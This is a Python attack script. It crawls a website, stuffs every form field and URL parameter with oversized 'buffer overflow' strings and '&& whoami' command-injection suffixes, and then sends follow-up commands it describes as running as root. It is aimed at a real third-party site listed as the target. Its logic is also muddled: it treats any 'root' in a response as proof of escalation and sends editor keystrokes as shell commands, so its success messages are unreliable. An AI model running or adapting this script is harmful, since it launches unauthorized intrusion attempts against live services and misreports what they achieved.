import requests
from bs4 import BeautifulSoup
import urllib.parse

def aggressive_crawl_site(base_url, max_depth=3):
    """Aggressively crawl the site to find all input fields and URL parameters."""
    visited = set()
    to_visit = [(base_url, 0)]
    discovered_entry_points = []
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36'}

    while to_visit:
        url, depth = to_visit.pop()
        if url in visited or depth > max_depth:
            continue
        visited.add(url)
        
        try:
            response = requests.get(url, headers=headers, timeout=10)
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Find all form elements
                forms = soup.find_all('form')
                for form in forms:
                    discovered_entry_points.append(('form', url, form))

                # Find all links to continue crawling
                links = soup.find_all('a', href=True)
                for link in links:
                    full_url = requests.compat.urljoin(url, link['href'])
                    if full_url not in visited and full_url.startswith(base_url):
                        to_visit.append((full_url, depth + 1))
                    # Treat links with query parameters as potential injection points
                    if '?' in full_url:
                        discovered_entry_points.append(('url', full_url, None))

        except requests.exceptions.Timeout:
            print(f"Timeout while crawling {url}. Skipping...")
        except Exception as e:
            print(f"Failed to crawl {url}: {e}")

    return discovered_entry_points

def execute_command_as_root(target_url, command):
    """Execute arbitrary command as root on the target URL."""
    try:
        # Construct payload to execute command
        payload = f' && {command}'
        response = requests.get(target_url, params={'payload': payload})

        if response.status_code == 200:
            print(f"Executed command '{command}' on {target_url} as root. Output:")
            print(response.text[:500])  # Display a snippet of the output for context
        else:
            print(f"Failed to execute command on {target_url}. Response: {response.status_code}")
    except Exception as e:
        print(f"Error executing command on {target_url}: {e}")

def inject_privilege_escalation_payload(target_url, payload):
    """Attempt to escalate privileges by injecting commands into the payload."""
    try:
        response = requests.get(target_url, params={'payload': payload})
        if response.status_code == 200:
            if 'root' in response.text.lower():
                print(f"Privilege escalation succeeded on {target_url}. 'whoami' returned 'root'.")
                
                # Simulate using nano to create and edit the proof file
                commands_to_execute = [
                    'nano /tmp/proof_of_exploit.txt',  # Open nano to edit the file
                    'echo "Exploit succeeded" > /tmp/proof_of_exploit.txt',  # Write to the file
                    'ctrl+o',  # Simulate saving with nano (if automating a sequence)
                    'ctrl+x',  # Simulate closing nano
                    'cat /tmp/proof_of_exploit.txt'  # Confirm the content
                ]
                
                for cmd in commands_to_execute:
                    execute_command_as_root(target_url, cmd)
                return True
            else:
                print(f"Privilege escalation failed on {target_url}. 'whoami' did not return 'root'.")
        else:
            print(f"Failed to execute payload on {target_url}. Response: {response.status_code}")
    except Exception as e:
        print(f"Error during privilege escalation on {target_url}: {e}")
    return False

def inject_payloads(entry_points):
    """Inject buffer overflow payloads into discovered entry points."""
    overflow_payload = "A" * 1024  # Example overflow payload
    
    for entry_type, url, form in entry_points:
        if entry_type == 'form':
            # Prepare form data with the overflow payload
            form_data = {}
            action = form.get('action')
            method = form.get('method', 'get').lower()

            for input_tag in form.find_all('input'):
                name = input_tag.get('name')
                if name:
                    form_data[name] = overflow_payload  # Test with the overflow payload

            target_url = requests.compat.urljoin(url, action)
            try:
                if method == 'post':
                    response = requests.post(target_url, data=form_data)
                else:
                    response = requests.get(target_url, params=form_data)

                if response.status_code == 200:
                    print(f"Received 200 OK from {target_url} with overflow payload.")
                    print(f"Response code: {response.status_code}")
                    print(response.text[:200])  # Print a snippet of the response for context
                    # Attempt privilege escalation
                    priv_esc_payload = overflow_payload + ' && whoami'
                    if inject_privilege_escalation_payload(target_url, priv_esc_payload):
                        continue

            except Exception as e:
                print(f"Error testing form at {target_url}: {e}")

        elif entry_type == 'url':
            # Append the payload to each parameter in the URL
            parsed_url = urllib.parse.urlparse(url)
            query_params = urllib.parse.parse_qs(parsed_url.query)
            for param in query_params:
                query_params[param] = overflow_payload  # Overwrite each parameter with the overflow payload

                new_query = urllib.parse.urlencode(query_params, doseq=True)
                target_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))

                try:
                    response = requests.get(target_url)
                    if response.status_code == 200:
                        print(f"Received 200 OK from {target_url} with overflow payload.")
                        print(f"Response code: {response.status_code}")
                        print(response.text[:200])  # Print a snippet of the response for context
                        # Attempt privilege escalation
                        priv_esc_payload = overflow_payload + ' && whoami'
                        if inject_privilege_escalation_payload(target_url, priv_esc_payload):
                            continue

                except Exception as e:
                    print(f"Error testing URL {target_url}: {e}")

def run_tests_on_targets(targets):
    """Crawl and test multiple targets (domains or specific URLs) for potential buffer overflow vulnerabilities."""
    for target in targets:
        print(f"\nTesting target: {target}")
        if target.startswith('http://') or target.startswith('https://'):
            base_url = target
        else:
            base_url = f"https://{target}"

        entry_points = aggressive_crawl_site(base_url)
        print(f"Found {len(entry_points)} potential entry points on {target}")
        inject_payloads(entry_points)

# List of domains or specific URLs to test
target_list = [
    "https://play.google.com/store/apps/details?id=com.travelocity.android", 
]

# Run the tests on the list of targets
run_tests_on_targets(target_list)
